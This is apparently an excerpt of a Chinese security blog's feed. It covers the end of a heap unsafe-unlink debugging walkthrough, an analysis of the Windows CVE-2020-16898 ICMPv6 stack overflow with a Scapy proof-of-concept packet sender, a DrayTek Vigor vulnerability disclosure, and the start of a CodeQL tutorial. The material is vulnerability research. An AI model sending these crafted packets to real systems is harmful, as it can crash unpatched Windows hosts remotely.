class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">In file: /pwn/unsafe_unlink.c</span><br><span class="line">   <span class="number">42</span> chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">   <span class="number">43</span> <span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">44</span> <span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">   <span class="number">45</span> chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line">   <span class="number">46</span></span><br><span class="line"> ► <span class="number">47</span> <span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line">$<span class="number">13</span> = <span class="number">0x430</span></span><br><span class="line">pwndbg&gt; chunkinfo <span class="number">0x56540553d6c0</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : True</span><br><span class="line">prev_size : <span class="number">0x420</span></span><br><span class="line">size : <span class="number">0x430</span></span><br><span class="line">prev_inused : <span class="number">0</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br><span class="line">fd_nextsize : <span class="number">0x0</span></span><br><span class="line">bk_nextsize : <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>此时就会判断 chunk0 为 free 状态，然后我们free chunk1_ptr 就会发生 unlink, unlink fake chunk的链接，覆盖chunk0_ptr</p><p>最后 我们可以使用chunk0_ptr覆盖自身，另其指向一个任意位置,达到一个任意地址写的目的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> ► <span class="number">54</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line">pwndbg&gt; p/x chunk0_ptr</span><br><span class="line">$<span class="number">22</span> = <span class="number">0x565403b5b008</span></span><br><span class="line">pwndbg&gt; p/x chunk0_ptr[<span class="number">3</span>]</span><br><span class="line">$<span class="number">23</span> = <span class="number">0x565403b5b008</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x565403b5b008</span></span><br><span class="line"><span class="number">0x565403b5b008</span>:<span class="number">0x0000565403b5b008</span><span class="number">0x00007f8ca43e66a0</span></span><br><span class="line"><span class="number">0x565403b5b018</span> &lt;completed&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000565403b5b008</span></span><br><span class="line"><span class="number">0x565403b5b028</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">   <span class="number">54</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line">   <span class="number">55</span></span><br><span class="line"> ► <span class="number">56</span> <span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; p/x chunk0_ptr</span><br><span class="line">$<span class="number">24</span> = <span class="number">0x7ffe4dfce4d0</span></span><br><span class="line">pwndbg&gt; p/x chunk0_ptr[<span class="number">3</span>]</span><br><span class="line">$<span class="number">25</span> = <span class="number">0x7f8ca42210b3</span></span><br><span class="line">pwndbg&gt; x/s <span class="number">0x7ffe4dfce4d0</span></span><br><span class="line"><span class="number">0x7ffe4dfce4d0</span>:<span class="string">&quot;Hello!~&quot;</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">58</span> chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"> ► <span class="number">59</span> <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/s <span class="number">0x7ffe4dfce4d0</span></span><br><span class="line"><span class="number">0x7ffe4dfce4d0</span>:<span class="string">&quot;BBBBAAAA&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Summary" scheme="https://bestwing.me/categories/Summary/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="Heap" scheme="https://bestwing.me/tags/Heap/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-16898 &quot;Bad Neighbor&quot; 分析</title>
    <link href="https://bestwing.me/CVE-2020-15898-analysis.html"/>
    <id>https://bestwing.me/CVE-2020-15898-analysis.html</id>
    <published>2020-10-19T16:00:00.000Z</published>
    <updated>2020-10-21T02:23:11.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2020年10月14日，微软修复了一个紧急漏洞：Windows TCP/IP 远程代码执行漏洞，漏洞编号为 CVE-2020-16898。</p><p>从14 号公开的信息可以得知，这是一个与 ipv6 协议有关，漏洞类型为栈溢出的漏洞。</p><h2 id="漏洞寻找"><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h2><p>通过公开信息</p><blockquote><p>A remote code execution vulnerability exists when the Windows TCP/IP stack improperly handles ICMPv6 Router Advertisement packets that use Option Type 25 (Recursive DNS Server Option) and a length field value that is even. In this Option, the length is counted in increments of 8 bytes, so an RDNSS option with a length of 3 should have a total length of 24 bytes. The option itself consists of five fields: Type, Length, Reserved, Lifetime, and Addresses of IPv6 Recursive DNS Servers. The first four fields always total 8 bytes, but the last field can contain a variable number of IPv6 addresses, which are 16 bytes each. As a result, the length field should always be an odd value of at least 3, per <a href="https://tools.ietf.org/html/rfc8106#section-5.3.1">RFC 8106</a>:</p></blockquote><p>以及补丁的 diff 我们大致定位了漏洞的位置</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020023239.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020023239.png"></a></p><p>漏洞发生的原因应该在 <code>Ipv6pUpdateRDNSS</code> 函数中</p><h2 id="Router-Advertisement-RA-for-short-协议"><a href="#Router-Advertisement-RA-for-short-协议" class="headerlink" title="Router Advertisement (RA for short) 协议"></a><code>Router Advertisement</code> (RA for short) 协议</h2><p>通过 <a href="https://tools.ietf.org/html/rfc8106#section-5.3.1">rfc8106</a> 我们可以知道协议报文如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0                   1                   2                   3</span><br><span class="line">0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|     Type      |     Length    |           Reserved            |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                           Lifetime                            |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                                                               |</span><br><span class="line">:            Addresses of IPv6 Recursive DNS Servers            :</span><br><span class="line">|                                                               |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>我们着重知道以下几个</p><ul><li><strong>Type（1个字节）</strong>：RDNSS选项类型的类型为 25（0x19）</li><li><strong>Length（1个字节）</strong>：如果该选项中包含一个 IPv6 地址，则长度取最小值3 。每增加一个 RDNSS 地址，长度就会增加2。接收器使用“长度”字段来确定选项中IPv6地址的数量</li><li><strong>Addresses of IPv6 Recursive DNS Servers（可变长度，由“Length”字段确定）</strong>：一个或多个递归DNS服务器的 128 位 IPv6 地址 。地址个数为（Length - 1）/ 2</li></ul><p>协议中规定：</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">o  The validity of DNS options is checked with the Length field;</span><br><span class="line">   that is, the value of the Length field in the RDNSS option is</span><br><span class="line">   greater than or equal to the minimum value (3) and satisfies the</span><br><span class="line">   requirement that (Length - 1) % 2 &#x3D;&#x3D; 0.  The value of the Length</span><br><span class="line">   field in the DNSSL option is greater than or equal to the minimum</span><br><span class="line">   value (2).  Also, the validity of the RDNSS option is checked with</span><br><span class="line">   the &quot;Addresses of IPv6 Recursive DNS Servers&quot; field; that is, the</span><br><span class="line">   addresses should be unicast addresses.</span><br></pre></td></tr></table></figure></blockquote><p>即 Length 长度字段要满足 <code>(Length - 1) % 2 == 0</code> 则 length 字段必为奇数，且是大于等于3 的奇数</p><p>假设此时 length 长度为 3， 则地址个数为 （3 - 1) / 2  == 1 ，我们知道一个地址长度为 16 字节。IPv6 Recursive DNS Servers 地址前的字段占 8 字节，每个 IPv6 Recursive DNS Servers 地址长度为 16 个字节，所以正常的 RDNSS 选项总长度应满足 16x+8（x&gt;=1），将其除以 8 就是 2x+1（x&gt;=1） ，也就是 Length 字段应该满足的条件。由于 IPv6 RDNSS 地址为 16 个字节，所以 RDNSS 选项总长度会以 16 字节递增，一个最小的长度为 24（8+16）</p><h2 id="如果-Length-是偶数"><a href="#如果-Length-是偶数" class="headerlink" title="如果 Length 是偶数"></a>如果 Length 是偶数</h2><p>通过学习协议，我们知道通常下， length 的值应为大于等 3 的奇数，但是如果当传入的 length 为偶数 2 ，那么会发生什么事情？</p><p>按照协议理解，此时 （2-1）/2 == 0 ，则会判断此 packet 没有地址，则理应会把 RDNSS 选项的最后 8 个字节错误的认为第下一个个选项的前8个字节。</p><p>例如假设我们设置 length 长度为 4 -&gt; rdnss.len = len(rdnss.dns) * 2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc_last_8_bytes</span>(<span class="params">target_addr</span>):</span></span><br><span class="line">    ip = IPv6(dst = target_addr, src = <span class="string">&quot;fe80::250:56ff:fec0:2222&quot;</span>)</span><br><span class="line">    ra = ICMPv6ND_RA()</span><br><span class="line"></span><br><span class="line">    rdnss = ICMPv6NDOptRDNSS(lifetime=<span class="number">900</span>, dns=[<span class="string">&quot;4141:4141:4141:4141:4141:4141:4141:4141&quot;</span>,</span><br><span class="line">            <span class="string">&quot;4242:4242:4242:4242:4242:4242:4242:4242&quot;</span>])</span><br><span class="line">    <span class="comment"># We put an even value for the option length (correct length should be 5)</span></span><br><span class="line">    rdnss.len = len(rdnss.dns) * <span class="number">2</span></span><br><span class="line">    <span class="comment"># We adjust the actual option size (when &#x27;confused&#x27; is appended to it,</span></span><br><span class="line">    <span class="comment"># it must be rdnss.len * 8 bytes == 0x20 bytes long)</span></span><br><span class="line">    truncated = bytes(rdnss)[: (rdnss.len<span class="number">-1</span>) * <span class="number">8</span>]</span><br><span class="line">    <span class="comment"># The last 8 bytes of the crafted RDNSS option are interpreted as</span></span><br><span class="line">    <span class="comment"># the start of a second option</span></span><br><span class="line">    confused = <span class="string">&#x27;XXXXYYYY&#x27;</span></span><br><span class="line">    crafted = truncated + confused</span><br><span class="line"></span><br><span class="line">    send(ip/ra/crafted)</span><br><span class="line"></span><br><span class="line">poc_last_8_bytes(<span class="string">&#x27;fd15:4ba5:5a2b:1008:79f7:979d:4e:97eb&#x27;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020031914.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020031914.png"></a></p><p>我们选取上面的一段汇编做一个简单的注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fffff801&#96;26bca5c8 e8a39de5ff     call    tcpip!NetioAdvanceNetBuffer (fffff801&#96;26a24370)</span><br><span class="line">fffff801&#96;26bca5cd 0fb64301       movzx   eax, byte ptr [rbx+1] ; eax &#x3D; option.length</span><br><span class="line">fffff801&#96;26bca5d1 8d4e01         lea     ecx, [rsi+1]</span><br><span class="line">fffff801&#96;26bca5d4 2bc6           sub     eax, esi              ; eax &#x3D; option.length - 1</span><br><span class="line">fffff801&#96;26bca5d6 4183cfff       or      r15d, 0FFFFFFFFh</span><br><span class="line">fffff801&#96;26bca5da 99             cdq     </span><br><span class="line">fffff801&#96;26bca5db f7f9           idiv    eax, ecx              ; eax &#x3D; (option.length - 1) &#x2F; 2</span><br><span class="line">fffff801&#96;26bca5dd 8b5304         mov     edx, dword ptr [rbx+4]</span><br><span class="line">fffff801&#96;26bca5e0 8945b7         mov     dword ptr [rbp-49h], eax</span><br><span class="line">fffff801&#96;26bca5e3 8bf0           mov     esi, eax</span><br><span class="line">fffff801&#96;26bca5e5 413bd7         cmp     edx, r15d</span><br></pre></td></tr></table></figure><p>即这断代码在做计算 地址数 <code>(4 - 1) / 2 == 1</code>. 因而会将 NET_BUFFER 前进 24 个字节（3*8）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; u rip</span><br><span class="line">tcpip!Ipv6pUpdateRDNSS+0xa9:</span><br><span class="line">fffff801&#96;26bca5dd 8b5304          mov     edx,dword ptr [rbx+4]</span><br><span class="line">fffff801&#96;26bca5e0 8945b7          mov     dword ptr [rbp-49h],eax</span><br><span class="line">fffff801&#96;26bca5e3 8bf0            mov     esi,eax</span><br><span class="line">fffff801&#96;26bca5e5 413bd7          cmp     edx,r15d</span><br><span class="line">fffff801&#96;26bca5e8 7412            je      tcpip!Ipv6pUpdateRDNSS+0xc8 (fffff801&#96;26bca5fc)</span><br><span class="line">fffff801&#96;26bca5ea 0fca            bswap   edx</span><br><span class="line">fffff801&#96;26bca5ec 8d0c12          lea     ecx,[rdx+rdx]</span><br><span class="line">fffff801&#96;26bca5ef 8bc1            mov     eax,ecx</span><br><span class="line">0: kd&gt; rax</span><br><span class="line">ax&#x3D;1</span><br></pre></td></tr></table></figure><p>当我们让程序走到下一个取下一个选项的时候，发现，此时的选项的前8个字节可被伪造</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020033744.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020033744.png"></a></p><h2 id="如何造成栈溢出的？"><a href="#如何造成栈溢出的？" class="headerlink" title="如何造成栈溢出的？"></a>如何造成栈溢出的？</h2><p>我们知道此时可以伪造前 8个字节，那么根据 type 可以走不同的程序流</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020034837.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020034837.png"></a></p><p>根据交叉引用，以及文档此时的函数有 三种 type，分别为</p><p>3： break ，似乎是正常消息</p><p>24：Route Information Option</p><p>25：RDNSS Option （<a href="https://tools.ietf.org/html/rfc4191#section-2.3%EF%BC%89">https://tools.ietf.org/html/rfc4191#section-2.3）</a></p><p>其中 25 是我们触发漏洞的地方， 那么可利用的似乎只有 24 了</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" title="image-20201021004540686" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" alt="image-20201021004540686"></a></p><p>当 type 为 24 的时候，会调用 <code>NdisGetDataBuffer</code> 该函数，我们发现此函数的 v221 值在栈上， Elen为可控的长度 * 8</p><p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisgetdatabuffer">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisgetdatabuffer</a></p><p>搜索微软文档我们发现该函数原型如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PVOID NdisGetDataBuffer(</span><br><span class="line">  PNET_BUFFER NetBuffer,</span><br><span class="line">  ULONG       BytesNeeded,</span><br><span class="line">  PVOID       Storage,</span><br><span class="line">  UINT        AlignMultiple,</span><br><span class="line">  UINT        AlignOffset</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>其第一个参数 NetBuffer 为一个指向 NET_BUFFER 结构的指针；第二个参数 BytesNeeded 为请求数据的长度；第三个参数 Storage 为指向缓冲区的指针，如果调用者不提供缓冲区，则为 NULL。如果此值非 NULL 且请求的数据不连续，则 NDIS 会将请求的数据复制到 Storage 指向的缓冲区。</p><p>NdisGetDataBuffer 函数返回指向连续数据的指针，或者NULL。如果缓冲区中请求的数据是连续的，则返回值是指向 NDIS 提供的位置的指针。如果数据不连续，则根据 Storage参数来判断：</p><ul><li>如果 Storage 参数为非 NULL，即指定缓冲区指针，则 NDIS 将数据复制到Storage 指向的缓冲区中，返回值为 Storage参数指针 。</li><li>如果 Storage 参数为 NULL，则返回值为 NULL。</li></ul><p>所以我们要通过此函数触发缓冲区溢出，则需要构造一个非连续的的数据包，这个问题的解决方案是构造一个 “碎片化” 的数据。对 IPv6 数据进行分段则可以。</p><p>如果我们发送带有畸形的RDNSS选项的Router Advertisement数据包时，将其分割成若干个IPv6碎片，那么重新组合的数据包数据就会以非连续的方式存储在NET_BUFFER中。这样一来，对NdisGetDataBuffer的调用就会从我们的数据包中复制任意数量的字节到堆栈中的固定大小的缓冲区中，导致基于堆栈的缓冲区溢出，使得我们可以用任意的值覆盖tcpip！Ipv6pHandleRouterAdvertisement的返回地址。</p><p>另外这里要有程序有一个检查，它允许路由信息选项的最大实际大小（option.Length * 3）为0x18。</p><p>即在一个循环遍历所有headers，做一些基本的验证</p><p>如图，Ipv6pHandleRouterAdvertisement 函数中会检查 Route Information 选项中的 Length 是否大于 3 ，如果大于 3 就会进入错误流程，然后忽略这个包的。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021003351.png" title="image-20201021003350639" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021003351.png" alt="image-20201021003350639"></a></p><p>在攻击的过程中</p><p>Route Information 选项的前 8 个字节被嵌到了第一个 Recursive DNS Server 选项的末尾。由于在 Case 0x19 的检查流程中，只判断了 Length 是否小于 3 ，而没有判断该字段是否是偶数值，可导致在对数据包选项进行检查的时候将第一个 Recursive DNS Server 选项长度误当成 0x20，因此检查是通过的。而在真正处理的过程中，又将其长度解析为 0x18</p><p>对于type为0x18会进入下面的流程处理，调用NdisGetDataBuffer函数，其中第二个参数为长度的实际字节大小，等于length<em>8，所以此时传入的actual_length_bytes = 0x22</em> 8 = 0x110：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" title="image-20201021004540686" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" alt="image-20201021004540686"></a></p><p>而Storage_1 为栈上的数组变量，将0x110个字节赋值过去，就会造成栈上的溢出，实际的崩溃是溢出覆盖了stack cookie，触发tcpip!_security_check_cookie，造成蓝屏（BSOD）：</p><p>最后贴一个蓝屏：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020040544.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020040544.png"></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.quarkslab.com/beware-the-bad-neighbor-analysis-and-poc-of-the-windows-ipv6-router-advertisement-vulnerability-cve-2020-16898.html">https://blog.quarkslab.com/beware-the-bad-neighbor-analysis-and-poc-of-the-windows-ipv6-router-advertisement-vulnerability-cve-2020-16898.html</a></p><p><a href="http://site.pi3.com.pl/exp/p_CVE-2020-16898.py">http://site.pi3.com.pl/exp/p_CVE-2020-16898.py</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2020-16898" scheme="https://bestwing.me/tags/CVE-2020-16898/"/>
    
  </entry>
  
  <entry>
    <title>DrayTek Vigor 2960 从未授权到rce</title>
    <link href="https://bestwing.me/drayteck-vigor-vulnerability-disclosure.html"/>
    <id>https://bestwing.me/drayteck-vigor-vulnerability-disclosure.html</id>
    <published>2020-10-18T16:00:00.000Z</published>
    <updated>2020-10-20T17:11:25.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>4月多的时候出差去了南京，加上三月初的时候 360 netlab 公开两个 DrayTek 的漏洞，我也简单分析了一下以及复现了下 exploit ，这里就不细讲了。所以晚上无聊的时候在找这个设备的是否存在其他漏洞，刚好巧合的是  @C0ss4ck（之前在我司实习过） 他也在看，所以一起挖掘了以下 11个漏洞</p><p>这里公开的 PPT 由@C0ss4ck 和我完成，由于时间安排所以我没去 DEFCON GROUP 25</p><div class="row"><iframe src="https://drive.google.com/file/d/1z4QZctHU3XYB-X9jXiWrTGhMLJqP27ub/preview" style="width:100%; height:550px"></iframe></div><p>可能有的人就问了，11 个漏洞，为啥只有 2个 cve 号呢？ 很简单，由于某些原因大家都知道 CVE 似乎不怎么理个人申请了，所以我们拜托的厂商帮我们申请的，厂商把漏洞分成 命令注入和缓冲区溢出 一起分批申请的，然后 CVE 只给了两个编号 （orz）</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li>2020.05.29 report these vulnerabilities</li><li>2020.06.01 vendor reply</li><li>2020.06.04 vendor fix these vulnerabilities</li><li>2020.06.17 vendor released new firmware</li><li>2020.06.19 CVE-2020-14472, CVE-2020-14473</li></ul><h2 id="官方致谢"><a href="#官方致谢" class="headerlink" title="官方致谢"></a>官方致谢</h2><p><a href="https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-remote-code-injection/execution-vulnerability-(cve-2020-14472)/">https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-remote-code-injection/execution-vulnerability-(cve-2020-14472)/</a></p><p><a href="https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-stack-based-buffer-overflow-vulnerability-(cve-2020-14473)/">https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-stack-based-buffer-overflow-vulnerability-(cve-2020-14473)/</a></p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><a href="https://gist.github.com/WinMin/46165779215f1d47ec257210428c0240">https://gist.github.com/WinMin/46165779215f1d47ec257210428c0240</a><br><a href="https://github.com/Cossack9989/Vulns/blob/master/IoT/CVE-2020-14473.md">https://github.com/Cossack9989/Vulns/blob/master/IoT/CVE-2020-14473.md</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="DrayTek" scheme="https://bestwing.me/tags/DrayTek/"/>
    
    <category term="CVE-2020-14472" scheme="https://bestwing.me/tags/CVE-2020-14472/"/>
    
    <category term="CVE-2020-14473" scheme="https://bestwing.me/tags/CVE-2020-14473/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 的学习以及尝试漏洞挖掘</title>
    <link href="https://bestwing.me/codeql.html"/>
    <id>https://bestwing.me/codeql.html</id>
    <published>2020-09-10T16:00:00.000Z</published>
    <updated>2021-02-06T08:52:26.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="CodeQL-背景"><a href="#CodeQL-背景" class="headerlink" title="CodeQL 背景"></a>CodeQL 背景</h2><p>CodeQL 是一个白盒源代码审计工具。其开发公司 Semmle 也成功和 Github 联姻，成立了 Github Security Lab，负责 Github 上开源软件的代码安全审计。</p><p>网上关于该工具的安装教程见官方文档，顺便一说网上的教程也不少，这里就不赘述了。</p><h2 id="CodeQL-使用"><a href="#CodeQL-使用" class="headerlink" title="CodeQL 使用"></a>CodeQL 使用</h2><p>官方提供了 QL 语法的文档： <a href="https://help.semmle.com/QL/ql-handbook/">https://help.semmle.com/QL/ql-handbook/</a> 以及 CodeQL 的一些 api 接口 <a href="https://help.semmle.com/qldoc/cpp/">https://help.semmle.com/qldoc/cpp/</a></p><p>关于CodeQL 使用，在这篇文章咱们以一个 Github Security Lab 公开的教程作为示例 </p><p>CodeQL CTF 2: U-Boot</p><ul><li><a href="https://securitylab.github.com/ctf/uboot">CTF 2: U-Boot Challenge</a> - Follow in the footsteps of our security research team and discover 13 vulnerabilities un U-Boot. Language: C - Difficulty level: </li></ul><h3 id="0x01-查找特定函数的定义"><a href="#0x01-查找特定函数的定义" class="headerlink" title="0x01 查找特定函数的定义"></a>0x01 查找特定函数的定义</h3><p>CodeQL 使用的时候需要通过 <code>import</code>  关键词导入特定语言的解析库，例如这里使用的是 <code>import cpp</code> ，如果我要查询 <code>strlen</code> 的函数定义，我只需要编写如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 